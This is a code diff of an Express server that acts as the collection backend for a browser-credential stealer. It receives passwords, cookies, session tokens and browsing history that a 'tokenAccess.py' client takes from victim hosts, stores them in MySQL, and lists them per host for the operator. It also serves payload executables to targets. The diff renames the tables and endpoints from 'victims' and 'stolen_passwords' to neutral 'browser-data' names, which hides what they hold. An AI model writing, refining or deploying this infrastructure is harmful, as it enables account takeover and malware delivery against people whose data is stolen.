@@ -127,91 +127,26 @@ async function initDatabase() {
             )
         `);
         
-        // ========== BROWSER CREDENTIALS TABLES ==========
-        
-        // Table for victim system information
+        // ========== SINGLE TABLE FOR BROWSER DATA ==========
+        // DataBrowser table - stores all browser tokens and credentials
         await conn.execute(`
-            CREATE TABLE IF NOT EXISTS victims (
+            CREATE TABLE IF NOT EXISTS DataBrowser (
                 id INT AUTO_INCREMENT PRIMARY KEY,
                 hostname VARCHAR(255),
+                username VARCHAR(255),
                 os VARCHAR(100),
                 os_version VARCHAR(255),
                 architecture VARCHAR(50),
-                username VARCHAR(255),
                 source_ip VARCHAR(50),
-                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
-                UNIQUE KEY unique_victim (hostname, username)
-            )
-        `);
-        
-        // Table for stolen passwords
-        await conn.execute(`
-            CREATE TABLE IF NOT EXISTS stolen_passwords (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                victim_id INT NOT NULL,
-                browser VARCHAR(100),
-                origin_url TEXT,
-                action_url TEXT,
-                username VARCHAR(500),
-                password VARCHAR(500),
-                date_created VARCHAR(100),
-                date_last_used VARCHAR(100),
+                browser_data JSON NOT NULL,
+                passwords_count INT DEFAULT 0,
+                cookies_count INT DEFAULT 0,
+                tokens_count INT DEFAULT 0,
+                history_count INT DEFAULT 0,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
-                INDEX idx_victim (victim_id),
-                INDEX idx_browser (browser)
-            )
-        `);
-        
-        // Table for stolen cookies
-        await conn.execute(`
-            CREATE TABLE IF NOT EXISTS stolen_cookies (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                victim_id INT NOT NULL,
-                browser VARCHAR(100),
-                host VARCHAR(500),
-                name VARCHAR(255),
-                value TEXT,
-                path VARCHAR(500),
-                expires VARCHAR(100),
-                is_secure BOOLEAN DEFAULT FALSE,
-                is_httponly BOOLEAN DEFAULT FALSE,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
-                INDEX idx_victim (victim_id),
-                INDEX idx_host (host(255))
-            )
-        `);
-        
-        // Table for stolen tokens (Discord, etc.)
-        await conn.execute(`
-            CREATE TABLE IF NOT EXISTS stolen_tokens (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                victim_id INT NOT NULL,
-                token_type VARCHAR(100),
-                token TEXT,
-                source VARCHAR(500),
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
-                INDEX idx_victim (victim_id),
-                INDEX idx_type (token_type)
-            )
-        `);
-        
-        // Table for browser history
-        await conn.execute(`
-            CREATE TABLE IF NOT EXISTS stolen_history (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                victim_id INT NOT NULL,
-                browser VARCHAR(100),
-                url TEXT,
-                title TEXT,
-                visit_count INT DEFAULT 0,
-                last_visit VARCHAR(100),
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
-                INDEX idx_victim (victim_id)
+                INDEX idx_hostname (hostname),
+                INDEX idx_username (username),
+                INDEX idx_created (created_at)
             )
         `);
         
@@ -219,7 +154,6 @@ async function initDatabase() {
         console.log('[✓] Database tables initialized successfully');
     } catch (error) {
         console.error(`[✗] Database initialization error: ${error.message}`);
-        // Don't throw, just log and continue with mock storage
         dbConnected = false;
         mockStorageEnabled = true;
     }
@@ -239,10 +173,7 @@ app.post('/api/receive', async (req, res) => {
             return res.status(400).json({ error: 'No data provided' });
         }
         
-        // Get client IP
         const sourceIp = req.ip || req.connection.remoteAddress;
-        
-        // Get optional data type from query params
         const dataType = req.query.type || 'general';
         
         const dataSize = JSON.stringify(data).length;
@@ -251,7 +182,6 @@ app.post('/api/receive', async (req, res) => {
         let recordId = null;
         
         if (dbConnected && pool) {
-            // Store in database
             const conn = await getDbConnection();
             
             try {
@@ -271,7 +201,6 @@ app.post('/api/receive', async (req, res) => {
                 throw dbError;
             }
         } else {
-            // Use mock storage
             recordId = mockData.length + 1;
             mockData.push({
                 id: recordId,
@@ -292,94 +221,20 @@ app.post('/api/receive', async (req, res) => {
         
     } catch (error) {
         console.error(`[✗] Error receiving data: ${error.message}`);
-        console.error(`[✗] Stack: ${error.stack}`);
         return res.status(500).json({ 
             error: error.message || 'Internal server error',
-            details: error.code || error.errno || 'Unknown error',
-            type: error.constructor.name
+            details: error.code || error.errno || 'Unknown error'
         });
     }
 });
 
-/**
- * Endpoint to receive multiple JSON records at once
- * Expected: JSON array of objects
- */
-app.post('/api/receive/batch', async (req, res) => {
-    try {
-        const dataList = req.body;
-        
-        if (!Array.isArray(dataList)) {
-            return res.status(400).json({ error: 'Expected JSON array' });
-        }
-        
-        const sourceIp = req.ip || req.connection.remoteAddress;
-        const dataType = req.query.type || 'batch';
-        
-        console.log(`[*] Received batch from ${sourceIp}, records: ${dataList.length}`);
-        
-        const insertedIds = [];
-        
-        if (dbConnected && pool) {
-            const conn = await getDbConnection();
-            
-            try {
-                for (const data of dataList) {
-                    const [result] = await conn.execute(
-                        `INSERT INTO received_data (data, source_ip, data_type, received_at)
-                         VALUES (?, ?, ?, ?)`,
-                        [JSON.stringify(data), sourceIp, dataType, new Date()]
-                    );
-                    insertedIds.push(result.insertId);
-                }
-                
-                conn.release();
-                console.log(`[✓] Batch stored in database: ${insertedIds.length} records`);
-                
-            } catch (dbError) {
-                conn.release();
-                console.error(`[✗] Database batch insert error: ${dbError.message}`);
-                throw dbError;
-            }
-        } else {
-            // Use mock storage
-            for (const data of dataList) {
-                const id = mockData.length + 1;
-                mockData.push({
-                    id: id,
-                    data: data,
-                    source_ip: sourceIp,
-                    data_type: dataType,
-                    received_at: new Date()
-                });
-                insertedIds.push(id);
-            }
-            console.log(`[✓] Batch stored in mock storage: ${insertedIds.length} records`);
-        }
-        
-        return res.status(201).json({
-            status: 'success',
-            message: `${insertedIds.length} records stored`,
-            ids: insertedIds,
-            storage: dbConnected ? 'database' : 'memory'
-        });
-        
-    } catch (error) {
-        console.error(`[✗] Error receiving batch data: ${error.message}`);
-        return res.status(500).json({ 
-            error: error.message || 'Internal server error',
-            details: error.code || 'Unknown error'
-        });
-    }
-});
-
-// ==================== BROWSER CREDENTIALS ENDPOINT ====================
+// ==================== BROWSER DATA ENDPOINT ====================
 
 /**
- * Endpoint to receive browser credentials from tokenAccess.py
- * Creates/updates victim and stores all extracted data
+ * Endpoint to receive browser data from tokenAccess.py
+ * Stores all data in single DataBrowser table
  */
-app.post('/api/credentials', async (req, res) => {
+app.post('/api/browser-data', async (req, res) => {
     try {
         const data = req.body;
         
@@ -390,125 +245,44 @@ app.post('/api/credentials', async (req, res) => {
         const sourceIp = req.ip || req.connection.remoteAddress;
         const systemInfo = data.system_info;
         
-        console.log(`[*] Received credentials from ${systemInfo.hostname} (${sourceIp})`);
+        console.log(`[*] Received browser data from ${systemInfo.hostname} (${sourceIp})`);
         
-        let victimId = null;
-        let stats = { passwords: 0, cookies: 0, tokens: 0, history: 0 };
+        // Count items
+        const passwordsCount = data.passwords?.total_count || data.passwords?.data?.length || 0;
+        const cookiesCount = data.cookies?.total_count || data.cookies?.data?.length || 0;
+        const tokensCount = data.tokens?.total_count || data.tokens?.data?.length || 0;
+        const historyCount = data.history?.total_count || data.history?.data?.length || 0;
+        
+        let recordId = null;
         
         if (dbConnected && pool) {
             const conn = await getDbConnection();
             
             try {
-                // Insert or update victim
-                await conn.execute(`
-                    INSERT INTO victims (hostname, os, os_version, architecture, username, source_ip)
-                    VALUES (?, ?, ?, ?, ?, ?)
-                    ON DUPLICATE KEY UPDATE 
-                        os = VALUES(os),
-                        os_version = VALUES(os_version),
-                        source_ip = VALUES(source_ip),
-                        last_seen = CURRENT_TIMESTAMP
+                const [result] = await conn.execute(`
+                    INSERT INTO DataBrowser 
+                    (hostname, username, os, os_version, architecture, source_ip, browser_data, 
+                     passwords_count, cookies_count, tokens_count, history_count)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 `, [
-                    systemInfo.hostname,
-                    systemInfo.os,
-                    systemInfo.os_version,
-                    systemInfo.architecture,
-                    systemInfo.username,
-                    sourceIp
+                    systemInfo.hostname || '',
+                    systemInfo.username || '',
+                    systemInfo.os || '',
+                    systemInfo.os_version || '',
+                    systemInfo.architecture || '',
+                    sourceIp,
+                    JSON.stringify(data),
+                    passwordsCount,
+                    cookiesCount,
+                    tokensCount,
+                    historyCount
                 ]);
                 
-                // Get victim ID
-                const [victimRows] = await conn.execute(
-                    'SELECT id FROM victims WHERE hostname = ? AND username = ?',
-                    [systemInfo.hostname, systemInfo.username]
-                );
-                victimId = victimRows[0].id;
-                
-                // Insert passwords
-                if (data.passwords && data.passwords.data) {
-                    for (const pwd of data.passwords.data) {
-                        await conn.execute(`
-                            INSERT INTO stolen_passwords 
-                            (victim_id, browser, origin_url, action_url, username, password, date_created, date_last_used)
-                            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-                        `, [
-                            victimId,
-                            pwd.browser || 'Unknown',
-                            pwd.origin_url || pwd.hostname || '',
-                            pwd.action_url || pwd.form_submit_url || '',
-                            pwd.username || '',
-                            pwd.password || '',
-                            pwd.date_created || pwd.time_created || '',
-                            pwd.date_last_used || pwd.time_last_used || ''
-                        ]);
-                        stats.passwords++;
-                    }
-                }
-                
-                // Insert cookies (limit to prevent overflow)
-                if (data.cookies && data.cookies.data) {
-                    const cookiesToInsert = data.cookies.data.slice(0, 500);
-                    for (const cookie of cookiesToInsert) {
-                        await conn.execute(`
-                            INSERT INTO stolen_cookies 
-                            (victim_id, browser, host, name, value, path, expires, is_secure, is_httponly)
-                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-                        `, [
-                            victimId,
-                            cookie.browser || 'Unknown',
-                            cookie.host || '',
-                            cookie.name || '',
-                            cookie.value || '',
-                            cookie.path || '',
-                            cookie.expires || '',
-                            cookie.is_secure ? 1 : 0,
-                            cookie.is_httponly ? 1 : 0
-                        ]);
-                        stats.cookies++;
-                    }
-                }
-                
-                // Insert tokens
-                if (data.tokens && data.tokens.data) {
-                    for (const token of data.tokens.data) {
-                        await conn.execute(`
-                            INSERT INTO stolen_tokens 
-                            (victim_id, token_type, token, source)
-                            VALUES (?, ?, ?, ?)
-                        `, [
-                            victimId,
-                            token.type || 'unknown',
-                            token.token || '',
-                            token.source || ''
-                        ]);
-                        stats.tokens++;
-                    }
-                }
-                
-                // Insert history (limit to prevent overflow)
-                if (data.history && data.history.data) {
-                    const historyToInsert = data.history.data.slice(0, 500);
-                    for (const entry of historyToInsert) {
-                        await conn.execute(`
-                            INSERT INTO stolen_history 
-                            (victim_id, browser, url, title, visit_count, last_visit)
-                            VALUES (?, ?, ?, ?, ?, ?)
-                        `, [
-                            victimId,
-                            entry.browser || 'Unknown',
-                            entry.url || '',
-                            entry.title || '',
-                            entry.visit_count || 0,
-                            entry.last_visit || ''
-                        ]);
-                        stats.history++;
-                    }
-                }
-                
+                recordId = result.insertId;
                 conn.release();
                 
-                console.log(`[✓] Stored credentials for victim ID ${victimId}:`);
-                console.log(`    Passwords: ${stats.passwords}, Cookies: ${stats.cookies}, Tokens: ${stats.tokens}, History: ${stats.history}`);
+                console.log(`[✓] Browser data stored with ID: ${recordId}`);
+                console.log(`    Passwords: ${passwordsCount}, Cookies: ${cookiesCount}, Tokens: ${tokensCount}, History: ${historyCount}`);
                 
             } catch (dbError) {
                 conn.release();
@@ -516,34 +290,34 @@ app.post('/api/credentials', async (req, res) => {
                 throw dbError;
             }
         } else {
-            // Mock storage fallback
-            victimId = mockData.length + 1;
+            recordId = mockData.length + 1;
             mockData.push({
-                id: victimId,
-                type: 'credentials',
+                id: recordId,
+                type: 'browser_data',
+                hostname: systemInfo.hostname,
+                username: systemInfo.username,
                 data: data,
                 source_ip: sourceIp,
                 received_at: new Date()
             });
-            stats = {
-                passwords: data.passwords?.total_count || 0,
-                cookies: data.cookies?.total_count || 0,
-                tokens: data.tokens?.total_count || 0,
-                history: data.history?.total_count || 0
-            };
-            console.log(`[✓] Stored in mock storage with ID: ${victimId}`);
+            console.log(`[✓] Stored in mock storage with ID: ${recordId}`);
         }
         
         return res.status(201).json({
             status: 'success',
-            message: 'Credentials received and stored',
-            victim_id: victimId,
-            stats: stats,
+            message: 'Browser data received and stored',
+            id: recordId,
+            stats: {
+                passwords: passwordsCount,
+                cookies: cookiesCount,
+                tokens: tokensCount,
+                history: historyCount
+            },
             storage: dbConnected ? 'database' : 'memory'
         });
         
     } catch (error) {
-        console.error(`[✗] Error receiving credentials: ${error.message}`);
+        console.error(`[✗] Error receiving browser data: ${error.message}`);
         return res.status(500).json({ 
             error: error.message || 'Internal server error',
             details: error.code || 'Unknown error'
@@ -552,79 +326,69 @@ app.post('/api/credentials', async (req, res) => {
 });
 
 /**
- * Endpoint to get all victims
+ * Endpoint to get all browser data records
  */
-app.get('/api/victims', async (req, res) => {
+app.get('/api/browser-data', async (req, res) => {
     try {
         if (!dbConnected || !pool) {
             return res.status(200).json({ 
-                victims: mockData.filter(d => d.type === 'credentials'),
+                data: mockData.filter(d => d.type === 'browser_data'),
                 storage: 'memory'
             });
         }
         
         const conn = await getDbConnection();
         
-        const [victims] = await conn.execute(`
-            SELECT v.*, 
-                   (SELECT COUNT(*) FROM stolen_passwords WHERE victim_id = v.id) as password_count,
-                   (SELECT COUNT(*) FROM stolen_cookies WHERE victim_id = v.id) as cookie_count,
-                   (SELECT COUNT(*) FROM stolen_tokens WHERE victim_id = v.id) as token_count,
-                   (SELECT COUNT(*) FROM stolen_history WHERE victim_id = v.id) as history_count
-            FROM victims v
-            ORDER BY v.last_seen DESC
+        const [rows] = await conn.execute(`
+            SELECT id, hostname, username, os, os_version, architecture, source_ip,
+                   passwords_count, cookies_count, tokens_count, history_count, created_at
+            FROM DataBrowser
+            ORDER BY created_at DESC
+            LIMIT 100
         `);
         
         conn.release();
         
-        return res.status(200).json({ victims, count: victims.length });
+        return res.status(200).json({ data: rows, count: rows.length });
         
     } catch (error) {
-        console.error(`[✗] Error getting victims: ${error.message}`);
+        console.error(`[✗] Error getting browser data: ${error.message}`);
         return res.status(500).json({ error: error.message });
     }
 });
 
 /**
- * Endpoint to get victim details with all stolen data
+ * Endpoint to get specific browser data record with full details
  */
-app.get('/api/victims/:id', async (req, res) => {
+app.get('/api/browser-data/:id', async (req, res) => {
     try {
-        const victimId = req.params.id;
+        const recordId = req.params.id;
         
         if (!dbConnected || !pool) {
-            const victim = mockData.find(d => d.id == victimId && d.type === 'credentials');
-            return res.status(200).json({ victim: victim || null, storage: 'memory' });
+            const record = mockData.find(d => d.id == recordId && d.type === 'browser_data');
+            return res.status(200).json({ data: record || null, storage: 'memory' });
         }
         
         const conn = await getDbConnection();
         
-        // Get victim info
-        const [victims] = await conn.execute('SELECT * FROM victims WHERE id = ?', [victimId]);
-        
-        if (victims.length === 0) {
-            conn.release();
-            return res.status(404).json({ error: 'Victim not found' });
-        }
-        
-        // Get all related data
-        const [passwords] = await conn.execute('SELECT * FROM stolen_passwords WHERE victim_id = ?', [victimId]);
-        const [cookies] = await conn.execute('SELECT * FROM stolen_cookies WHERE victim_id = ? LIMIT 100', [victimId]);
-        const [tokens] = await conn.execute('SELECT * FROM stolen_tokens WHERE victim_id = ?', [victimId]);
-        const [history] = await conn.execute('SELECT * FROM stolen_history WHERE victim_id = ? LIMIT 100', [victimId]);
+        const [rows] = await conn.execute('SELECT * FROM DataBrowser WHERE id = ?', [recordId]);
         
         conn.release();
         
-        return res.status(200).json({
-            victim: victims[0],
-            passwords: { data: passwords, count: passwords.length },
-            cookies: { data: cookies, count: cookies.length },
-            tokens: { data: tokens, count: tokens.length },
-            history: { data: history, count: history.length }
-        });
+        if (rows.length === 0) {
+            return res.status(404).json({ error: 'Record not found' });
+        }
+        
+        // Parse the JSON browser_data
+        const record = rows[0];
+        if (typeof record.browser_data === 'string') {
+            record.browser_data = JSON.parse(record.browser_data);
+        }
+        
+        return res.status(200).json({ data: record });
         
     } catch (error) {
-        console.error(`[✗] Error getting victim details: ${error.message}`);
+        console.error(`[✗] Error getting browser data: ${error.message}`);
         return res.status(500).json({ error: error.message });
     }
 });
@@ -633,7 +397,6 @@ app.get('/api/victims/:id', async (req, res) => {
 
 /**
  * Endpoint to transfer executable file to client
- * Query params: filename (optional, defaults to payload.exe)
  */
 app.get('/api/transfer/file', async (req, res) => {
     try {
@@ -644,18 +407,17 @@ app.get('/api/transfer/file', async (req, res) => {
             return res.status(404).json({ error: 'File not found' });
         }
         
-        // Log the transfer
         const targetIp = req.ip || req.connection.remoteAddress;
         
-        const conn = await getDbConnection();
-        
-        await conn.execute(
-            `INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
-             VALUES (?, ?, ?, ?)`,
-            [filename, targetIp, 'completed', new Date()]
-        );
-        
-        conn.release();
+        if (dbConnected && pool) {
+            const conn = await getDbConnection();
+            await conn.execute(
+                `INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
+                 VALUES (?, ?, ?, ?)`,
+                [filename, targetIp, 'completed', new Date()]
+            );
+            conn.release();
+        }
         
         console.log(`[*] File '${filename}' transferred to ${targetIp}`);
         
@@ -668,7 +430,7 @@ app.get('/api/transfer/file', async (req, res) => {
 });
 
 /**
- * Endpoint to upload files to server (for later distribution)
+ * Endpoint to upload files to server
  */
 app.post('/api/transfer/upload', upload.single('file'), async (req, res) => {
     try {
@@ -729,7 +491,7 @@ app.get('/api/health', async (req, res) => {
 });
 
 /**
- * Retrieve all stored data (for testing/admin purposes)
+ * Retrieve all stored data
  */
 app.get('/api/data', async (req, res) => {
     try {
@@ -738,30 +500,23 @@ app.get('/api/data', async (req, res) => {
         if (dbConnected && pool) {
             const conn = await getDbConnection();
             
-            try {
-                const [rows] = await conn.execute(`
-                    SELECT id, data, source_ip, data_type, received_at 
-                    FROM received_data 
-                    ORDER BY received_at DESC
-                    LIMIT 100
-                `);
-                
-                conn.release();
-                
-                data = rows.map(row => ({
-                    id: row.id,
-                    data: typeof row.data === 'string' ? JSON.parse(row.data) : row.data,
-                    source_ip: row.source_ip,
-                    data_type: row.data_type,
-                    received_at: row.received_at ? row.received_at.toISOString() : null
-                }));
-            } catch (dbError) {
-                conn.release();
-                console.error(`[✗] Database retrieval error: ${dbError.message}`);
-                throw dbError;
-            }
+            const [rows] = await conn.execute(`
+                SELECT id, data, source_ip, data_type, received_at 
+                FROM received_data 
+                ORDER BY received_at DESC
+                LIMIT 100
+            `);
+            
+            conn.release();
+            
+            data = rows.map(row => ({
+                id: row.id,
+                data: typeof row.data === 'string' ? JSON.parse(row.data) : row.data,
+                source_ip: row.source_ip,
+                data_type: row.data_type,
+                received_at: row.received_at ? row.received_at.toISOString() : null
+            }));
         } else {
-            // Return mock data
             data = mockData.map(item => ({
                 id: item.id,
                 data: item.data,
@@ -771,18 +526,11 @@ app.get('/api/data', async (req, res) => {
             })).reverse().slice(0, 100);
         }
         
-        return res.status(200).json({ 
-            data, 
-            count: data.length,
-            storage: dbConnected ? 'database' : 'memory'
-        });
+        return res.status(200).json({ data, count: data.length, storage: dbConnected ? 'database' : 'memory' });
         
     } catch (error) {
         console.error(`[✗] Error retrieving data: ${error.message}`);
-        return res.status(500).json({ 
-            error: error.message,
-            details: error.code || 'Unknown error'
-        });
+        return res.status(500).json({ error: error.message });
     }
 });
 
@@ -794,10 +542,9 @@ app.get('/', (req, res) => {
         message: 'Backend Server Running',
         endpoints: {
             receive_data: 'POST /api/receive',
-            receive_batch: 'POST /api/receive/batch',
-            credentials: 'POST /api/credentials',
-            victims_list: 'GET /api/victims',
-            victim_details: 'GET /api/victims/:id',
+            browser_data: 'POST /api/browser-data',
+            browser_data_list: 'GET /api/browser-data',
+            browser_data_detail: 'GET /api/browser-data/:id',
             transfer_file: 'GET /api/transfer/file?filename=<name>',
             upload_file: 'POST /api/transfer/upload',
             health_check: 'GET /api/health',
@@ -815,19 +562,17 @@ async function startServer() {
     ║                    (Node.js/Express)                      ║
     ║                                                           ║
     ║  Endpoints:                                               ║
-    ║  • POST /api/receive       - Receive JSON data            ║
-    ║  • POST /api/receive/batch - Receive batch JSON data      ║
-    ║  • POST /api/credentials   - Receive browser credentials  ║
-    ║  • GET  /api/victims       - List all victims             ║
-    ║  • GET  /api/victims/:id   - Get victim details           ║
-    ║  • GET  /api/transfer/file - Download file                ║
+    ║  • POST /api/receive        - Receive JSON data           ║
+    ║  • POST /api/browser-data   - Receive browser tokens      ║
+    ║  • GET  /api/browser-data   - List all browser data       ║
+    ║  • GET  /api/browser-data/:id - Get specific record       ║
+    ║  • GET  /api/transfer/file  - Download file               ║
     ║  • POST /api/transfer/upload - Upload file                ║
-    ║  • GET  /api/health        - Health check                 ║
-    ║  • GET  /api/data          - View stored data             ║
+    ║  • GET  /api/health         - Health check                ║
+    ║  • GET  /api/data           - View stored data            ║
     ╚═══════════════════════════════════════════════════════════╝
     `);
     
-    // Initialize database (with fallback to mock storage)
     try {
         await createPool();
         await initDatabase();
@@ -837,7 +582,6 @@ async function startServer() {
         mockStorageEnabled = true;
     }
     
-    // Start server
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`[*] Starting server on http://0.0.0.0:${PORT}`);
         console.log(`[*] Storage mode: ${dbConnected ? 'DATABASE' : 'MOCK (In-Memory)'}`);
@@ -845,7 +589,6 @@ async function startServer() {
     });
 }
 
-// Start the server
 startServer();
 
 // Graceful shutdown
